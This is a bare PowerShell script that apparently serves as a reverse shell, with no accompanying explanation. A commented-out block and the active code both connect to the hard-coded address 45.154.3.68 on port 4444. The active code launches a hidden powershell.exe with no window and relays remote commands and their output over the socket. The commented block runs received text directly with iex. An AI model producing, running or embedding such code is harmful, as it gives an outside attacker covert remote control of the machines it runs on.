# while ($true) {
#     try {
#         $client = New-Object System.Net.Sockets.TCPClient
#         $client.Connect("45.154.3.68", 4444)
#         if ($client.Connected) {
#             $stream = $client.GetStream()
#             [byte[]]$bytes = 0..65535 | % {0}
#             while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
#                 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
#                 $sendback = (iex $data 2>&1 | Out-String)
#                 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
#                 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
#                 $stream.Write($sendbyte, 0, $sendbyte.Length)
#                 $stream.Flush()
#             }
#             $client.Close()
#         }
#     } catch {
#     }
#     Start-Sleep -Seconds 10
# }

$client = New-Object System.Net.Sockets.TCPClient("45.154.3.68", 4444)
$stream = $client.GetStream()
$networkStream = New-Object System.IO.StreamWriter($stream)
$networkReader = New-Object System.IO.StreamReader($stream)

# Create a hidden PowerShell process with redirected I/O
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.RedirectStandardInput = $true
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError = $true
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true

$process = New-Object System.Diagnostics.Process
$process.StartInfo = $psi
$process.Start() | Out-Null

$stdout = $process.StandardOutput
$stderr = $process.StandardError
$stdin = $process.StandardInput

# Background thread to write PowerShell output to socket
Start-Job {
    while (-not $stdout.EndOfStream) {
        try {
            $line = $stdout.ReadLine()
            if ($line) {
                $bytes = [System.Text.Encoding]::ASCII.GetBytes($line + "`n")
                $stream.Write($bytes, 0, $bytes.Length)
                $stream.Flush()
            }
        } catch {}
    }
} | Out-Null

# Background thread to also stream stderr
Start-Job {
    while (-not $stderr.EndOfStream) {
        try {
            $line = $stderr.ReadLine()
            if ($line) {
                $bytes = [System.Text.Encoding]::ASCII.GetBytes($line + "`n")
                $stream.Write($bytes, 0, $bytes.Length)
                $stream.Flush()
            }
        } catch {}
    }
} | Out-Null

# Main loop: read from socket and feed into PowerShell stdin
while ($true) {
    try {
        $input = $networkReader.ReadLine()
        if ($input -ne $null) {
            $stdin.WriteLine($input)
            $stdin.Flush()
        }
    } catch {
        break
    }
}

$client.Close()
